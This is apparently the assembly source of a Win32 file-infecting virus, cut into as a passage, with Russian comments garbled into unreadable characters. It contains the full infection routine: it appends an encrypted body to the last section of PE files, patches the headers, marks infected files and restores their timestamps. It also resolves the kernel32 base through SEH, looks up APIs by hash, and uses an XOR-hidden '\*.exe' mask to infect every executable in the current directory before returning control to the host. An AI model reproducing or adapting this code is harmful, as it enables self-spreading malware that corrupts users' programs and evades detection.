	mov		ecx,SizeAddrIsklComand+5+SizeHashTable1
_rmb1_:
	mov		al,byte ptr [edi]
	mov		byte ptr [edx],al
	inc		edi
	inc		edx
	dec		ecx
	jne		_rmb1_
;------------------------------------------------------------------------------------------------
		                                                ;�த������; �.�. �� ��६�蠫� ࠭����� ���� ������, � 
	mov		edi,AddrShifrCode                           ;⥯��� �� ��।� ����襬 �� �����
	mov		edx,edi
	add		edi,CorVirSize
	add		edi,SizeAddrIsklComand	
	push	edi;										;�� ⨯� ������ ���� dwEntry ⮫쪮 � ����� ����:)!
	add		edi,SizeHashTable1+5
	
_nxtaddr_:	
	push	ebx
	push	esi
	push	edi	
	mov		esi,dword ptr [esi]
	cmp		byte ptr [esi+4],'8'                        ;ᬮ�ਬ, �� ���� _START_ ?
	jne		_rmb2_
	mov		eax,dword ptr [esp+12]                      ;�᫨ ��, � ��� ���� ⠪�� ��ࠢ��� ���࠭� call'�, ����� ��뢠�� ����� ����:)! 
	mov		ecx,edi
	sub		ecx,eax
	mov		dword ptr [eax+1],ecx
_rmb2_:
	mov		al,byte ptr [esi]
	mov		byte ptr [edi],al
	inc		esi
	inc		edi
	cmp		ebx,dword ptr [esi]
	jne		_rmb2_
;------------------------------------------------------------------------------------------------
                                                        ;�����, ⠪ ��� ⥯��� ����� ����ᠭ� �� ���� ���ᠬ, � 
	mov		ebx,[esp+4]                                 ;� ��襩 ⠡��窥 �᪫�祭�� (��) ⠪�� ������ ���� �������� ���� �᪫�祭��, 
	xor		ecx,ecx                                     ;ᮮ⢥�����騥 ������
_nxtoffset_:
	mov		eax,[edx+ecx*8]
	add		eax,[esp+12]								;!!!!! optimization!
	sub		eax,CorVirSize
	
	cmp		eax,dword ptr [ebx]                         ;��� �� �஢��塞, �ਭ������� �� ��।��� ���� �� �� ⮫쪮 �� ����ᠭ���� �����?
	jb		@F
	cmp		eax,esi
	jae		@F
	                                                    ;�᫨ ��, � 
	push	ecx                                         ;����⠥� ��� ᬥ饭�� (�� �⮬ �⠩ ���) ��� ������ ����
	mov		ecx,esi
	sub		ecx,eax
	mov		eax,edi
	sub		eax,ecx
	sub		eax,[esp+12+4]
	pop		ecx
	push	ecx

	lea		ecx,dword ptr [edx+ecx*8]
	add		ecx,CorVirSize
	mov		dword ptr [ecx],eax                        ;� ��࠭�� ��� � ��
	pop		ecx
@@:
    inc		ecx                                        ;���� � ᫥���饬� ����� � �����窥 �᪫�祭�� (��)
    cmp		ecx,(SizeAddrIsklComand-2)/8
    jne		_nxtoffset_
;------------------------------------------------------------------------------------------------
	
	pop		esi;edi
	pop		esi                                         ;���室�� � ᫥���饬� ����� (᫥���饬� �����)
	pop		ebx	
	add		esi,4
	cmp		word ptr [esi+4],0ffffh                     ;� ⠪ �� �।��᫥����� ���� (�.�. �� ��� ����⠢���� �� �㤥�)
	jne		_nxtaddr_

	mov		dword ptr [edi],ebx                        	;����襬 ��᫥���� ��થ� (��� ����� � ��� ����:)!

;------------------------------------------------------------------------------------------------		
                                                        ;��᫥ ⮣�, ��� �� ��६�蠫� � ����ᠫ� �� �����, � ⠪�� 
	                                          			;᪮�४�஢��� �� ���� � ��, � ��� �� - ⥯��� �����猪 �� �����஢���   
	mov		edi,AddrShifrCode                           ;(� ������ ���� ⠪�� - �� �⮬ �⠩ � spectr.asm). ����� �� ��� ࠧ �� � ������㥬 
	add		edi,CorVirSize                              ;� ���浪� �����⠭��.

	;push	edi
	;add		edi,SizeAddrIsklComand+5
	;lea		ecx,dword ptr [edi+SizeHashTable1]
	;CallFunc	ebx,ecx,dwEntry,'9'
	;pop		edi

fnSort:
	xor		eax,eax
	xor		ecx,ecx
_l1_:
	lea		ecx,[eax+1]
_l2_:
	mov		edx,[edi+ecx*8]
	cmp		[edi+eax*8],edx
	jbe		@F
	mov		ebx,[edi+eax*8]
	mov		[edi+eax*8],edx
	mov		[edi+ecx*8],ebx

	mov		ebx,[edi+eax*8+4]
	push	dword ptr [edi+ecx*8+4]
	pop		dword ptr [edi+eax*8+4]
	mov		[edi+ecx*8+4],ebx

@@:
	inc		ecx
	cmp		ecx,(SizeAddrIsklComand-2)/8;5
	jne		_l2_
	inc		eax
	cmp		eax,(SizeAddrIsklComand-2)/8-1;4
	jne		_l1_	        
;------------------------------------------------------------------------------------------------
	                                                    ;� �� ���� ���� - �� ᡠ�����㥬 ���:)!
	pop		ebx
	sub		ebx,SizeAddrIsklComand
	mov		AddrShifrCode,ebx                           ;��࠭�� ���� ����
;xxxxxxxxxxxxxxxxxxxxxxxxxxxEND ������������ ������xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	
	popad
;------------------------------------------------------------------------------------------------
	mov		edi,pExe;                        			;edi - mapped address
	push	edi
	mov		ecx,CorVirSize
	mov		ebx,FA										;ebx - FileAlignment
                                  						;⥯��� �� ����� FileAlignment
	dec		ebx                                         ;���⮬� 㧭��� ��� ���� ࠧ��� �����
	add		ecx,ebx                                     ;�� ⮩ �� ��㫥, �� �뫠 ����ᠭ� ���(���砫� �⮩ �㭪樨 � �������)
	not		ebx
	and		ecx,ebx
	mov		ebx,wfdChgFileSize							;wfd.nFileSizeLow ;ebx - ��ଠ��� ࠧ��� 䠩�� (�� ��䥪�)
	add		ecx,ebx

	mov		wfdChgFileSize,ecx                 			;� ��࠭塞 ����祭�� ࠧ���                               
;------------------------------------------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBEG ���૥�xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	
	lea		ecx,[eax+edx]                               ;ecx = PointerToRawData+SizeOfRawData
	cmp		ecx,ebx		                           		;�஢��塞, ᮤ�ন� �� 䠩� ���૥�
	jge		_noOverlay_
	sub		ecx,ebx                           			;�᫨ ��, � ��६�頥� ��� � ��� (⠪ ��� ������� 䠩�� ���� ��� ������ � ����:)
	                                                    ;�� �� 䠪�!
	neg		ecx
	lea		esi,[edi+ebx-1]
	add		edi,wfdChgFileSize
	dec		edi                
_repmovsbstd_:
	mov		bl,byte ptr [esi]
	mov		byte ptr [edi],bl
	dec		esi
	dec		edi
	dec		ecx
	jne		_repmovsbstd_
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxEND ���૥�xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;------------------------------------------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBEG INFECT!xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
_noOverlay_:
	pop		edi                         				;edi - mapped address
	add		edi,eax                                     ;���室�� � ����� 䠩��(�� ��᪥:)!
	add		edi,edx
	mov		esi,AddrShifrCode                           ;esi - �� ��砫� ��襣� ����쪠                                 
	mov		ecx,CorVirSize                              ;ࠧ��� ���稢襣��� ����஢������ ��襣� ����쪠:)!

	CallFunc	eax,ecx,dwEntry,'3'	  					;call	rep_movsb
														;� ������ ᢮� �㯥�᪮� ����:)!
;------------------------------------------------------------------------------------------------
	
	mov		esi,tmpAddrTblIskl                          ;����⠭�������� ࠭�� ��࠭���� 5 ���� � ����
	mov		edi,dwEntry
	add		edi,5+SizeHashTable1-4-5-SizeBat-4-20
	push	20
	pop		ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb

;------------------------------------------------------------------------------------------------			
	pushad
	push	MEM_DECOMMIT
	push 	SizeSPECTRCode
	push	tmpAddrTblIskl
	call	_fVirtualFree								;�᢮������� �뤥������ ������
	popad
;------------------------------------------------------------------------------------------------	


;------------------------------------------------------------------------------------------------

	mov		edi,pRSizeOfLastSec							;�����塞 䨧��᪨� ࠧ��� ��᫥���� ᥪ樨
	                                  					;SizeOfRawData=ALIGN_UP(SizeOfRawData+VirusSize,FileAlignment);
	mov		eax,dword ptr [edi]
	add		eax,CorVirSize               
	mov		ebx,FA
	dec		ebx
	add		eax,ebx
	not		ebx
	and		eax,ebx
	mov		dword ptr [edi],eax
;------------------------------------------------------------------------------------------------
	mov		esi,pVSizeOfLastSec							;�����塞 ����㠫�� ࠧ��� ��᫥���� ᥪ樨
	;=dword ptr $-4                                  	;if((VirualSize+VirusSize)>SizeOfRawData)
	mov		ecx,dword ptr [esi]                         ;	VirtualSize=VirtualSize+VirusSize;
	add		ecx,CorVirSize                              ;else
	cmp		eax,ecx                                     ;	VrtualSize=SizeOfRawData(㦥 ���������)
	jge		_nor_                                       ;
	mov		dword ptr [esi],ecx
	jmp		_na_
_nor_:              
	mov		dword ptr [esi],eax
_na_:	
	mov		eax,dword ptr [esi]
	;lodsd
;------------------------------------------------------------------------------------------------
	mov		edi,pSizeOfImage							;�����塞 ࠧ��� ��ࠧ�
	;=dword ptr $-4                                  	;SizeOfImage=VirtualSize+VirtualAddress

	mov		ebx,VirtAddr	                            
	                                                    ;VirtualSize - 㦥 ��������� (���᭮ ��᫥���� ᥪ樨)
	add		eax,ebx                                     ;VirtualAddress - ��᫥���� ᥪ樨
	mov		dword ptr [edi],eax
;------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------
	mov		eax,pExe                         			;�⠢�� ���� ��䥪�
	mov		word ptr [eax+34h],'sr'
;------------------------------------------------------------------------------------------------	
_error_:
;------------------------------------------------------------------------------------------------
_unmap_:		
	pushad
	push	pExe;[pExe+ebp]                             ;�᢮�������
	call	_fUnmapViewOfFile
	popad
;------------------------------------------------------------------------------------------------
_error2_:
	mov		edi,szPath                                  ;
;------------------------------------------------------------------------------------------------

	CallFunc	eax,ecx,dwEntry,'4'	 					;call	fnOpenFile
	                                                    ;���뢠�� 䠩� ��� �⥭��/�����                                  
	inc		eax
	je		_enx_
	dec		eax
	xchg	eax,esi
;------------------------------------------------------------------------------------------------	
	lea		eax,[ebp+4*2+14h]							;wfd.ftLastWriteTime ;����⠭�������� �६� (��᫥���� ����䨪�樨)
	pushad
	push	eax
	push	ebx
	push	ebx
	push	esi
	call	_fSetFileTime
	popad
;------------------------------------------------------------------------------------------------
	mov		eax,wfdChgFileSize
	pushad
	push	FILE_BEGIN
	push	ebx
	push	eax
	push	esi
	call	_fSetFilePointer							;��१��� 䠩� �� �㦭�� �����
	popad

	pushad
	push	esi
	call	_fSetEndOfFile                            	;��⮢�
	popad

	pushad
	push	esi
	call	_fCloseHandle                             	;����뢠�� ���
	popad
;------------------------------------------------------------------------------------------------
_enx_:
	pushad
	push	dword ptr [ebp+4*2]							;wfd.dwFileAttributes
	push	edi
	call	_fSetFileAttributesA                      	;����⠭�������� ���� ��ਡ���
	popad

	mov		esi,dword ptr [ebp-4*26]
	mov		eax,dword ptr [ebp-4*25]                    ;and eax
	lea		esp,dword ptr [ebp-4*24]                    ;and stack
	ret                                                 ;��室��:)!

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 InfectFiles
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	




_isklvir3_:
db	'viri','3'
Sizeisklvir3	equ		$ - _isklvir3_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� rep_movsb
;������ rep movsb (cld)
;�ᯮ����⥫쭠� �㭪��
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
rep_movsb:
	mov		al,byte ptr [esi]
	mov		byte ptr [edi],al
	inc		esi
	inc		edi
	dec		ecx
	jne		rep_movsb
	ret	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 rep_movsb
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






_isklvir4_:
db	'viri','4'
Sizeisklvir4	equ		$ - _isklvir4_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� fnOpenFile
;����⨥ 䠩�� �� �⥭��-������
;�室:
;edi - ���� (���) � 䠩��
;ebx - ���� (0)
;��室:
;��� - �����饭��� ���祭��
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
fnOpenFile:
	xor		ebx,ebx	
	push	ebx
	pushad
	push	ebx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_READ+FILE_SHARE_WRITE
	push	GENERIC_READ+GENERIC_WRITE
	push	edi
	call	_fCreateFileA                               ;���뢠�� ᭮�� ����� (����� 䠩�)
_iskl3_:
	mov		dword ptr [esp+20h],eax
Sizeiskl3	equ		$ - _iskl3_
	popad	
	pop		eax	
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 fOpenFile
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir5_:
db	'viri','5'
Sizeisklvir5	equ		$ - _isklvir5_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� ValidPE
;�஢�ઠ �ࠢ��쭮�� ��-䠩��
;�室:
;eax - ���� � �����
;��室:
;�᫨ �� ��-䠩�, � edx!=0, ���� edx=0.
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ValidPE:
	push	ebx
	mov		bx,631Ah                        			;������⪠
	xor		bx,3957h
	mov		edx,0D625h
	xor		edx,9375h                                    ;'ZM'(MZ)
	cmp		word ptr [eax],bx
	jne 	_invalid0_
	mov		ebx,dword ptr [eax+3Ch]                     ;���室�� � ��-���������
	cmp		ebx,200h
	jg		_invalid0_                                      
	cmp		word ptr [eax+ebx],dx                       ;'EP'(PE)
	je		_itispe_
_invalid0_:
	xor		edx,edx
_itispe_:
	pop		ebx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 ValidPE
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






_isklvir6_:
db	'viri','6'
Sizeisklvir6	equ		$ - _isklvir6_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� GetKernelSEH
;���� ���� Kernel32.dll �१ SEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetKernelSEH:
	xor		edx,edx
	mov		esi,dword ptr fs:[edx]              		;� ��� - 㪠��⥫� �� �������� ERR
_searchk_:
	mov		eax,dword ptr [esi]
	add		esi,4
	;lodsd			                    				;��᫥���� �����
	inc		eax                                         ;������ ���� ࠢ�� 0�ffffffff
	je		_okhandler_                                 ;
	dec		eax
	xchg	esi,eax
	jmp		_searchk_
_okhandler_:
	mov		eax,dword ptr [esi]
	add		esi,4
	;lodsd		                            			;�᫨ ��諨 � ��᫥����� ������
														;���� ��ࠡ��稪�
	xor		ax,ax                                       ;�࠭��୮��� �뤥����� �����
	push	06h
	pop		ecx                                         ;���稪 ��࠭��
_next0_:

	CallFunc	edx,ecx,[esp+4],'5'	 					;call	ValidPE
														;�஢�ઠ ��।��� ��࠭���
	test	edx,edx
	je		_sub0_
	xchg	esi,eax			                        	;� esi - ᨤ�� ��� ����
	ret
_sub0_:
	sub		eax,10000h                      			;� ��⮬ �࠭��୮��
	dec		ecx
	jne		_next0_
	;loop	_next0_
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 GetKernelSEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir7_:
db	'viri','7'
Sizeisklvir7	equ		$ - _isklvir7_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� GetGetProcAddress
;���� ���� ����室���� �㭪樨 ��⥬ �ࠢ����� ��襩
;�室:
;esi - ���� �����(Kernel32.dll, User32.dll, etc)
;edi - ���� ⠡���� ��襩
;��室: 
;� �⥪� �㦭� ���� ���襪
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetGetProcAddress:
	assume	esi:ptr IMAGE_DOS_HEADER     				;esi - ��������� MZ
	mov		ebx,esi
	add		esi,[esi].e_lfanew
	add		esi,4
	add		esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER            	;esi - ��樮����� ���������
	mov		esi,[esi].DataDirectory[0].VirtualAddress
	add		esi,ebx
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY              ;esi - ������� IMAGE_EXPORT_DIRECTORY
	push	esi
	mov		esi,[esi].AddressOfNames
	add		esi,ebx                                     ;esi - ���ᨢ ���� �㭪権
	push	esi
;------------------------------------------------------------------------------------------------
_BeginSearch_:  										;���� ���� �㭪樨 ��⥬ �ࠢ����� �襩:)
	xor		edx,edx                         			;� edx - �࠭�� ������
_next1_:
    push	esi
    mov		esi,dword ptr [esi]
	add		esi,ebx
;------------------------------------------------------------------------------------------------
_CalcHash_:                                           	;��⠥� �� �� �����
	xor		eax,eax
	xor		ecx,ecx
_calc_:
	ror		eax,7
	xor		ecx,eax
	mov		al,byte ptr [esi]
	inc		esi
	test	al,al
	jne		_calc_
	cmp		ecx,dword ptr [edi]       			
	pop		esi
	je		_okhash_                                    ;�᫨ �� ᮢ����
	inc		edx                                         ;���� 㢥��稢��� edx
	mov		eax,dword ptr [esi]
	add		esi,4
	jmp		_next1_
_okhash_:
	mov		esi,dword ptr [ebp-4*2]
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY
	push	esi
	mov		esi,[esi].AddressOfNameOrdinals             ;esi - ���ᨢ᫮� � �����ᠬ�
	add		esi,ebx                                     ;���ᨢ �न�����(16 ���)
	movzx	edx,word ptr [esi][edx*2]
	pop		esi
	sub		edx,[esi].nBase                             ;���⠥� ��砫�� �न���
	inc		edx                                         ;⠪ ��� ��砫�� �न��� ��稭������ 1
	mov		esi,[esi].AddressOfFunctions
	add		esi,ebx                                     ;edi - ���ᨢ ���ᮢ �㭪権
	mov		edx,dword ptr [esi][edx*4]
	add		edx,ebx                                     ;� edx - ���� �㦭�� �㭪樨
	push	edx                                         ;������ ���� � ���
	add		edi,4
	mov		esi,dword ptr [ebp-4*3]
	cmp		word ptr [edi],0ffffh                       ;�� �� ���� �������?
	jne		_BeginSearch_                               ;�᫨ ���, � �饬 �����
	push	dword ptr [ebp-4*1]                         ;���� ��室��:)!
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 GetGetProcAddress
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	

	



	
_isklvir8_:
db	'viri','8'
Sizeisklvir8	equ		$ - _isklvir8_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;��砫� �믮������ ��襣� ����!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
_START_:
    ;mov		eax,VirusSize
    ;mov		eax,SizeMut1
    ;mov		ecx,SizeMut2
	pop		ebx                                         ;
	sub		esp,140h									;��� WIN32_FIND_DATA
	push	ebx 										;ebx - start

	CallFunc	edx,ecx,ebx,'6'	 						;call	GetKernelSEH
														;��뢠�� �㭪�� ����祭�� ���� Kernel32.dll
	call	_delta0_                                    ;����塞 �����-ᬥ饭��
_delta0_:
	sub		dword ptr [esp],offset _delta0_
	mov		ebp,esp                                     ;��⠭�������� ebp=esp
	mov		edi,dwEntry

	;cmp		delta,0
	;je		_nodelta_
	;push	edi
	;lea		ecx,dword ptr [edi+SizeHashTable1]
	;CallFunc	ebx,ecx,dwEntry,'9'
	;pop		edi

;_nodelta_:	
	CallFunc	ebx,ecx,dwEntry,'7'	 					;call	GetGetProcAddress
	                                                    ;��뢠�� �㭪�� ����祭�� ���ᮢ �㦭�� ���襪                           
;------------------------------------------------------------------------------------------------
	sub		dwEntry,5
	mov		eax,dwEntry
	sub		eax,SizeAddrIsklComand
	lea		ebx,dword ptr [esp-4]

	;mov		ecx,dwEntry
	;add		ecx,5+SizeHashTable1-4-5-SizeBat-4
	;mov		edx,dword ptr [edx]	


	pushad	
	push	ebx;esp
	push	PAGE_EXECUTE_READWRITE
	push    VirusSize;dword ptr [ecx]
	push    eax
	call	_fVirtualProtect                            ;������ ��ਡ� ��࠭���(� ���ன �ᯮ����� ��� ��મ�� ���:)! PAGE_EXEUCUTE_READWRITE
	popad
;------------------------------------------------------------------------------------------------
	push	eax
	pushad
	call	@F
szUser32		db 'user32.dll',0
SizeszUser32	equ		$-szUser32

@@:	
	;pushz	"user32.dll"
	call	_fLoadLibraryA                              ;����㦠�� User32.dll
_iskl4_:
	mov		dword ptr [esp+20h],eax
Sizeiskl4	equ		$ - _iskl4_
	popad
	pop		eax	
;------------------------------------------------------------------------------------------------	
	push	eax
	pushad	
	call	@F
szMessageBoxA	db 'MessageBoxA',0
SizeszMessageBoxA	equ		$ - szMessageBoxA

@@:
	push	eax
	call	_fGetProcAddress                            ;����砥� ���� ���誨 "MessageBoxA"
_iskl5_:
	mov		dword ptr [esp+20h],eax
Sizeiskl5	equ		$ - _iskl5_
	popad
	pop		eax
	
	push	eax                                         ;� ��࠭塞 ��� � ���
;------------------------------------------------------------------------------------------------
	lea		edi,[ebp+4*2+2ch]							;wfd.cFileName
	
	pushad
	push	edi
	push	MAX_PATH
	call	_fGetCurrentDirectoryA                      ;����砥� ⥪���� ��४���
	popad
	
	push	edi
	xor		eax,eax
	dec		edi
_scas001_:
	inc		edi
	cmp		al,byte ptr [edi]
	jne		_scas001_
	mov		dword ptr [edi],'cool'                   	;������⪠
	mov		dword ptr [edi+4],'fire'                	;� 䨭��� ��ࠧ���� ��᪠: "\*.exe"
	xor		dword ptr [edi],06414530h
	xor		dword ptr [edi+4],6669171dh
	pop		edi

;xxxxxxxxxxxxxxxxxxxxBEG ���� � ��䥪� 䠩��� � ⥪�饩 ��४�ਨxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	lea		esi,[ebp+4*2]								;wfd	
	push	eax
	pushad	
	push	esi
	push	edi
	call	_fFindFirstFileA                            ;��砫� ���᪠
_iskl6_:                                                ;��।��� �᪫�祭��
	mov		dword ptr [esp+20h],eax
Sizeiskl6	equ		$ - _iskl6_
	popad
	pop		eax
	
	inc		eax
	test	eax,eax
	je		_exitfind_	
	dec		eax                                         ;�᫨ 㤠筮, 
	push	eax;save hFindFile                          ;� ��࠭塞 ����祭�� ���
	                                                        
_findfile_:
	mov		eax,dwEntry
	add		eax,5
	add		eax,SizeHashTable1
	sub		eax,4
	push	dword ptr [eax] 							;��࠭塞 OEP(������쭮 ⮫쪮 ��� ��ࢮ�� ��������� - ��㣨� ��!)

	CallFunc	ebx,ecx,dwEntry,'2'	       				;call	InfectFiles
	                                                    ;��뢠�� �㭪�� ��䥪� ��-䠩���                                	
	pop		dword ptr [eax]                             ;����⠭�������� OEP
			
	push	eax
	pushad
	push	esi
	push	dword ptr [esp+28h]                    		;hFindFile
	call	_fFindNextFileA                             ;�த������ ����
_iskl7_:                                                ;��।��� ����-�᪫�祭��
	mov		dword ptr [esp+20h],eax
Sizeiskl7	equ		$ - _iskl7_
	popad
	pop		eax
	
	test	eax,eax
	jne		_findfile_
;xxxxxxxxxxxxxxxxxxxxEND ���� � ��䥪� 䠩��� � ⥪�饩 ��४�ਨxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	
_exitfind_:

	CallFunc	eax,ecx,dwEntry,'1'	 					;call	Play	
	                                                    ;"�������� ����㧪�:)!" �맮� ���ᠣ�                  						
	cmp		delta,0                                     ;ᬮ�ਬ - ��ࢮ� �� ���������?
	je		_firstgen_                                  ;�᫨ ��, � �� ��室
;------------------------------------------------------------------------------------------------                         	
_final_:                                                ;
	mov		eax,dwEntry
	add		eax,SizeHashTable1+5-4
	mov		edi,dword ptr [eax]
	
	pushad
	lea		ecx,dword ptr [esp-4]
	push	ecx
	push	PAGE_EXECUTE_READWRITE
	push    1000h
	push    edi
	call	_fVirtualProtect                            ;�����塞 ��ਡ��� (�⮡� ����� �뫮 ����� jmp ����⠭����� �ਣ������ 5 ���� �����)
	popad
		
	lea		esp,[ebp+4*2+140h]                          ;��ࠢ������ ���
;------------------------------------------------------------------------------------------------
	push	edi
	sub		eax,5+SizeBat+4+20
	push	20
	pop		ecx
	xchg	eax,esi

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
	                                                    ;� ���ࠥ� ��� jmp 5 ���⠬� �����
	                                                    ;���� ������, ����⠭�������� �����		                            	
	pop		edi

	mov		esp,[esp+8]
	sub		eax,eax
	pop		dword ptr fs:[eax]
	pop		eax
	jmp		edi                                         ;� ��।��� �ࠢ����� ���⥫�(���⢥:)!
;------------------------------------------------------------------------------------------------

_isklvir9_:
db	'viri','9'
Sizeisklvir9	equ		$ - _isklvir9_

comment #
Crypt:
	push	eax
	mov		eax,12345678h
_xor_:
	xor		dword ptr [edi],eax
	add		edi,4
	cmp		edi,ecx
	jb		_xor_
	pop		eax
	ret


_isklvir10_:
db	'viri','A'
Sizeisklvir10	equ		$ - _isklvir10_
        #

;------------------------------------------------------------------------------------------------
_end_:
VirusSize		equ ($-start+1000)                      ;ࠧ��� ��襣� ����쪠:)! (+�����, �.�. ��� 㦥 ����஢���� ��� �㤥� �����)
SizeSPECTRCode	equ	10000h								;�㤥� �뤥���� ������ ��� ��⠬��� � ����ᮬ
;------------------------------------------------------------------------------------------------
	
;------------------------------------------------------------------------------------------------
_firstgen_:
	push	0
	call	ExitProcess                                 ;��室 � ��
end start
;------------------------------------------------------------------------------------------------
;��� ᨫ�� - ᫠�� �ᥣ�� �� �����!
